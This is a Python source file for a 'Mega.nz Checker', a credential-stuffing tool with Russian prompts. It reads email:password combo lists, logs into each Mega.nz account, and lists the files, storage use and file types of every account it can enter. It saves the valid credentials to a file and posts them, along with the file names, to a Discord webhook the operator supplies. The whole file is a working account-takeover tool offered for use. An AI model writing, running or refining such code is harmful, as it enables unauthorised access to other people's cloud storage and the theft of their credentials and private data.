import func
import os
import re
import sys

from mega import Mega
from func import fail, hit, logo, custom, error
from multiprocessing.pool import ThreadPool as Pool
from colorama import init, Fore, Back, Style

from discord_webhook import DiscordWebhook
from datetime import datetime

GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
ROYAL_BLUE = '\033[94m'
RESET = '\033[0m'

# Основные настройки
os.system(f"title Mega.nz Checker 23XT [BuXoI Wolf] and Methodllo [スペースー]")
logo()
now = datetime.now()
formatted_time = now.strftime("%Y/%m/%d %H:%M:%S")
global hits

try:
    print(f"{BLUE}=============================================================================={RESET}")

    input(f"Поместите ваши комбинации в файл data.txt в формате EMAIL:ПАРОЛЬ и нажмите Enter.")
    try:
        with open("data.txt", "r", encoding="utf-8") as g:
            lines = g.readlines()
            size = len(lines)
        print(f"{RED if size == 0 else GREEN}\nНайдено {size} строк.")
    except Exception:
        print(f"\n{RED}Такого файла нет data.txt {RESET}\n")
        input()
        print(f"{ROYAL_BLUE}не забудь его добавить{RESET}")
        input()
        sys.exit(0)
    pool_size = 10

    print(f"{BLUE}=============================================================================={RESET}")

    name = input(f"Введите имя файла для сохранения результатов:")
    if name == "":
        filename = f"save{name}.txt"
        print(f"\nРезультаты будут сохранены в файл{GREEN} {filename}{RESET}")
    else:
        filename = name + '.txt'
        print(f"\nРезультаты будут сохранены в файл{GREEN} {filename}{RESET}")

    print(f"{BLUE}=============================================================================={RESET}")

    search_string = input(f"Введите ключевое слово для поиска в учетной записи."
                          f" Оставьте поле пустым, если поиск не требуется:")

    if search_string == "":
        print(f"\nПоисковая строка не выбрана. Значение {RED}FALSE{RESET} будет возвращено.")
    else:
        print(f"\nВыбранное ключевое слово: [ {search_string} ]. Если найдено, значение TRUE будет возвращено.\n")

    print(f"{BLUE}=============================================================================={RESET}")

    webhook_Custom = input(f"Чтобы обращения отправлялись в ваш Discord, введите webhook и нажмите enter."
                           f" В противном случае оставьте поле пустым:")
    if webhook_Custom == "":
        print(f"\n{RED}Webhook не подключен")
    else:
        print(f"\nWebhook подключен. Уведомления также будут отправляться в webhook."
              f" Вы получите тестовое сообщение прямо сейчас.")
        webhook = DiscordWebhook(url=webhook_Custom, content=(
            f"# Webhook успешно подключен!\n### Количество строк в комбо: {size}\n### Файл экспорта: {filename}\n### Ожидание запуска..."))
        response = webhook.execute()

    print(f"{BLUE}=============================================================================={RESET}")
    checked = 0
    hits = 0
    customs = 0
    fails = 0


    def truncate_message(message, max_length=2000):
        """Обрезает сообщение до указанной максимальной длины."""
        if len(message) > max_length:
            return message[:max_length - 3] + '```'
        return message


    def check(username, password):
        global checked
        global hits
        global customs
        global fails
        tab_name = f"title Проверка - Проверено: [{checked} / {size}] - Найдено: [{hits}] - Custom: [{customs}] - Недействительно: [{fails}]"
        mega = Mega()
        os.system(tab_name)
        try:
            m = mega.login(username, password)
            space = m.get_storage_space(giga=True)
            used = round(space["used"], 2)
            total = space["total"]
            files = m.get_files()
            file_count = len(files)

            # Сбор расширений файлов
            extensions = []
            file_names = []
            for file in files.values():
                file_name = file["a"]["n"]
                file_names.append(file_name)
                match = re.search(r'\.([a-zA-Z0-9]+)$', file_name)
                if match:
                    extensions.append(match.group(1).lower())
                else:
                    extensions.append('unknown')
                file_names_str = '\n'.join(file_names)

            extension_count = {ext: extensions.count(ext) for ext in set(extensions)}
            found = search_string in str(files) if search_string else False

            hit_str = (f"# {'°˖✧◝(⁰▿⁰)◜✧˖°' if used > 0.0 else '┌∩┐(◣_◢)┌∩┐ '} \n"
                       f"```diff\n"
                       f" {username}:{password}\n"
                       f"{'+' if used > 0.0 else '-'} Используемое пространство:  {used}GB\n"
                       f"  Общее пространство:         {total}GB\n"
                       f"  Время находки:              {formatted_time}\n"
                       f"  Позиция строки:             [{checked + 1} - {size}]\n"
                       f"  Количество файлов:          {file_count}\n"
                       f"  Расширения файлов:          {extension_count}\n"
                       f"```\n"
                       f"Названия файлов:\n"
                       f"```"
                       f"{file_names_str}\n```")

            hit_str = truncate_message(hit_str)

            print(f"{GREEN if used > 0.0 else YELLOW}{hit()} {username}:{password}\n"
                  f"- Используемое пространство: {used}GB\n"
                  f"- Общее пространство: {total}GB\n"
                  f"- Позиция строки: [{checked + 1} / {size}]\n"
                  f"- Количество файлов: {file_count}\n"
                  f"- Расширения файлов: {', '.join([f'{k}: {v}' for k, v in extension_count.items()])}\n"
                  f"- Названия файлов:")

            for i in range(0, len(file_names), 5):
                print(f"{GREEN if used > 0.0 else YELLOW}  " + ", ".join(file_names[i:i + 5]) + RESET)
            print(RESET)
            try:
                webhook = DiscordWebhook(url=webhook_Custom, content=hit_str)
                response = webhook.execute()
            except:
                print(f"{error()} Ошибка Webhook / Не добавлен.")

            if used != 0.0:
                with open(filename, "a", encoding="utf8") as e:
                    e.writelines(
                        f"\n{username}:{password}\n"
                        f"Используемое пространство: {used}GB\n"
                        f"Общее пространство: {total}GB\n"
                        f"Количество файлов: {file_count}\n"
                        f"Расширения файлов: {extension_count}\n"
                        f"Названия файлов: {file_names}\n"
                        f"\n=====================\n")
                    hits += 1
            else:
                with open("Zero_GB_Used.txt", "a", encoding="utf8") as files:
                    files.write(
                        f"\n{username}:{password}\n"
                        f"Используемое пространство: {used}GB\n"
                        f"Общее пространство: {total}GB\n"
                        f"Количество файлов: {file_count}\n"
                        f"Расширения файлов: {extension_count}\n"
                        f"Названия файлов: {file_names}\n"
                        f"\n=====================\n")
                    hits += 1

        except Exception as e:
            if "User blocked" in str(e):
                print(f"{custom()} {username}:{password} заблокирован.")
                customs += 1
            else:
                print(f"{fail()} {username}:{password} недействителен.")
                fails += 1
        checked += 1


    pool = Pool(pool_size)

    with open("data.txt", "r", encoding="utf-8") as f:
        lines = f.readlines()

    for item in lines:
        try:
            username, password = item.split(":")
            password = password.strip()
            username = username.strip()
            pool.apply_async(check(username, password), (username, password))
        except Exception as e:
            pass

    pool.close()
    pool.join()

    summary_str = (f"```diff\n"
                   f"! Проверка завершена\n"
                   f"! Всего проверено: {checked}\n"
                   f"! Комбинаций в файле: {size}\n"
                   f"! Имя файла экспорта: {name}\n"
                   f"! Hits: {hits}\n"
                   f"! Custom: {customs}\n"
                   f"! Недействительно: {fails}\n"
                   f"! Ключевое слово: [ {search_string} ]```")

    summary_str = truncate_message(summary_str)

    try:
        webhook = DiscordWebhook(url=webhook_Custom, content=summary_str)
        response = webhook.execute()
    except Exception:
        print(f"{RED}файл data.txt пуст{RESET}")
        input()

    input(f"\n\n\n{ROYAL_BLUE}Проверка завершена. Хиты экспортированы в {filename}. Webhook отправлен с результатами. Нажмите Enter для выхода.{RESET}")
except KeyboardInterrupt as e:
    print(f"\n\n{ROYAL_BLUE}Остановка: {e}{RESET}")

